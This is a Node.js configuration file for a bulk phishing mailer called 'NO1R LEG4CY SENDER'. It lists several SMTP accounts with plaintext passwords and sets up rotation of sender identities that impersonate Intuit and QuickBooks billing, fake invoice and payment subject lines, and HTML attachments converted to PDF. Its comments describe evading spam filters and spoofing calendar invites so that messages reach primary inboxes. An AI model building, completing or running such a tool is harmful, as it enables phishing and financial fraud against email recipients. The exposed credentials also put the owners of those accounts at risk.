#!/usr/bin/env node

/**
 * =================================================================
 * 🛡️ NO1R LEG4CY SENDER v3.0.0 - OFFICIAL CONFIGURATION
 * =================================================================
 * * [SECTION 1] SMTP & API CREDENTIAL STORE
 * Utility: Defines your delivery engines (SMTP or Graph API).
 * How it works: You can add unlimited SMTP accounts. The script 
 * will use these accounts based on the rotation logic you choose.
 */
const smtp = [
  {
    "host": "smtp.gmail.com",
    "port": 587,
    "secure": false,
    "username": "nfdconstructionsllc@gmail.com",
    "password": "fxmf jsku quff uvim",
    "from_email": "nfdconstructionsllc@gmail.com",
  },
  // You can add more SMTP objects here for better rotation
  {
    "host": "smtp.gmail.com",
    "port": 587,
    "secure": false,
    "username": "loloyola10@gmail.com",
    "password": "bgdk imcm vojm uvfp",
    "from_email": "loloyola10@gmail.com",
    
  },
   {
    "host": "secure.emailsrvr.com",
    "port": 587,
    "secure": false,
    "username": "miguel@pacificwestsound.com",
    "password": "ChangeMe!",
    "from_email": "e.drive@pacificwestsound.com",
   
  },
  {
    "host": "smtp.gmail.com",
    "port": 587,
    "secure": false,
    "username": "Rtime458@gmail.com",
    "password": "kupg ctae vpkg eysk",
    "from_email": "Rtime458@gmail.com",
  
  },
  {
    "host": "smtp.nifty.com",
    "port": 587,
    "secure": false,
    "username": "rsr34855@nifty.com",
    "password": "EtZai68MbO70",
    "from_email": "support@alvinscables.com",
    
  },
];

const graph_api = {
  active: false, 
  clientId: "", 
  tenantId: "",
  clientSecret: "",
  tokenPath: "./tokens.json" 
};

/**
 * [SECTION 2] GLOBAL DELIVERY CONTROLLER
 * Utility: The core brain that manages randomization and bypassing filters.
 * * --- 📝 MULTIPLE LETTER LOGIC ---
 * If 'use_multiple_letters' is TRUE, the script picks a random HTML 
 * file from 'multi_letters' for every lead to avoid footprint detection.
 * * --- 👤 MULTIPLE FROM-NAME LOGIC ---
 * If 'multiple_fromName' is TRUE, the script shuffles names from 
 * 'multi_FromName' so recipients see different sender names.
 * * --- 📧 MULTIPLE SUBJECT LOGIC ---
 * If 'multiple_subject' is TRUE, it rotates subjects from 
 * 'multi_subject' to bypass subject-based spam filters.
 */
const setup = {
  key: "key", 
  MultipleSmtp: "ROTATE", // Options: "ROTATE" or "SINGLE"
  mail_priority: "HIGH", 
  sleep_time: 3,          // Delay in seconds between emails
  isMultiThread: false, 
  howManyThread: 10, 
  
  // --- Letter & Image Rotation ---
  LetterToImage: true,    // Renders HTML into a protected image
  fileName_LetterToImage: "./letterToImage.html",
  use_multiple_letters: true, 
  letter: "letter.html",  // Default letter if multi is OFF
  multi_letters: [
    "letter_invoice_A.html",
    "letter_receipt_B.html",
    "letter_notification_C.html"
  ],
  use_multiple_images: true, 
  multi_images: [
    "template_1.html", 
    "template_2.html"
  ],

  // --- Dynamic Identity Shuffling ---
  multiple_fromName: true, 
  multi_FromName: [
    "Intuit Billing Support",
    "QuickBooks Global Payments",
    "Accounting Services Department",
    "Service Notification Center"
  ],

  multiple_subject: true, 
  multi_subject: [
    "Urgent: Your Invoice #<RANDNUM4> is Ready",
    "Payment Confirmation for Transaction ID: <RANDSTRING1>",
    "Action Required: Service Update for <DOMAIN>",
    "Your recent payment of $7,890.00 was successful"
  ],

  // --- From-Mail Management ---
  use_noreply: false, 
  from_name: "<RANDNUM5>", // Fallback if multiple_fromName is OFF
  mail_subject: "<RANDNUM4>", // Fallback if multiple_subject is OFF
  test_frommail: false, 
  frommail_filename: "frommail.txt", 
  hide_frommail: false, 
  
  // --- Advanced Features ---
  replyTo: "support@yourdomain.com", 
  useAttachment: true, 
  useOfflineAttachment: true, 
  attachmentToPdf: true,
  useGrabLogo: false, 
  defaultLogo: "https://img-prod-cms-rt-microsoft-com.akamaized.net/...",
  useMylogo: false, 
  proxy: "" 
};

/**
 * [SECTION 3] CALENDAR INVITE ENGINE
 * Utility: Sends high-trust meeting requests (.ics files).
 * How it works: Calendar invites often bypass "Promotions" and land 
 * directly in the "Primary" inbox with a notification on the phone.
 */
/**
 * SECTION 4: CALENDAR INVITE CONFIGURATION
 * Utility: Sends a formal .ics meeting request to the recipient.
 * How it works: It embeds a calendar event into the email metadata. 
 * This often triggers a "Meeting Notification" on the recipient's phone/computer.
 */
const calendar_invite = {
  active: false,                // Toggle TRUE to enable sending calendar invites instead of regular emails
  TIMEZONE: "America/Adak",     // Sets the local time for the meeting to avoid global time confusion
  SUMMARY: "",                  // The main Title/Subject of the calendar event seen by the lead
  DESCRIPTION: "",              // The body text or notes inside the calendar event details
  LOCATION: "<DOMAIN>",         // Where the meeting is held (can use dynamic tags like recipient's domain)
  METHOD: "REQUEST",            // Standard protocol; 'REQUEST' forces the 'Accept/Decline' buttons to appear
  STATUS: "CONFIRMED",          // Sets the event status to 'Confirmed' to look more legitimate
  TRANSP: "OPAQUE",             // Blocks the user's time on their calendar as "Busy"
  ORGANIZER_CN: "",             // Display Name of the person sending the invite
  ORGANIZER_EMAIL: "<EMAIL>",   // Email address of the organizer (can use the recipient's email to spoof)
  ATTENDEE_CN: "Verified Sender", // Display Name shown for the person attending
  ATTENDEE_EMAIL: "administrator@<DOMAIN>", // Secondary email displayed in the invite list
  RSVP: false,                  // Set TRUE if you want the recipient to send a response back
  BUSYSTATUS: "BUSY",           // Marks the recipient's calendar as occupied during this time
  DISALLOW_COUNTER: true,       // Prevents the recipient from suggesting a new time for the meeting
  IMPORTANCE: 1,                // Sets the priority level (1 = High Priority)
  REMINDER_MINUTES: 15,         // Triggers a notification popup X minutes before the event starts
  REMINDER_TEXT: "",            // The alert message that appears on the user's screen/phone
  START_DATE: "01/07/2026",     // The scheduled date of the event (DD/MM/YYYY)
  START_TIME: "10:30",          // The specific time the meeting starts
  END_DATE: "01/07/2026",       // The date the event concludes
  END_TIME: "10:45",            // The time the event concludes
  DURATION_MINUTES: 15          // Total length of the meeting slot
};

/**
 * [SECTION 4] ATTACHMENTS & EML WRAPPING
 */
const attachment = [
  {
    filename: "Document_<RANDOMNAME>.pdf", 
    path: "attachment.html",
    useOfflineAttachment: true,
    attachmentToPdf: true, 
  }
];

const attachment_EML = {
  use_EML: false, // Wraps the entire message inside an .eml file attachment
  attachment_name_EML: "Message_<COMPANYNAME>.eml",
  letter_eml: "EML/letter.html",
  useAttachment_EML: true,
  attachment: [{ attachmentName: "<COMPANYNAME>.html", path: "EML/attachment.html" }]
};

/**
 * [SECTION 5] RANDOMIZER & MACRO CONFIG
 * Utility: Defines the variables used in tags like <RANDNUM4>.
 */
const generate_random_number = [
  { name: "RANDNUM1", length_value: 1 },
  { name: "RANDNUM4", length_value: 4 },
  { name: "RANDNUM5", length_value: 5 }
];

const generate_random_string = [
  { name: "RANDSTRING1", length_value: 8, type: "UPPERCASE" }
];

const setup_time_date = {
  time_zone: "America/Adak",
  time_format_lang: "en"
};

const others = {
  letterImageName: "core_output.png", 
  cid: "NOIRLEGACY_ENGINE", 
  AutoLogin: true,
  rejectUnauthorized: false, 
  att_CT: "text/html"
};

const myLOGO = [{ function_name: "MYLOGO", nameFile: "https://drive.google.com/..." }];

module.exports = {
  smtp, setup, graph_api, mailbox_extractor: { active: false }, 
  generate_random_number, generate_random_string, setup_time_date, 
  attachment, myLOGO, attachment_EML, others, redirect_link: { useRedirect: false },
  generate_QRCODE: { activate: false }, calendar_invite
};
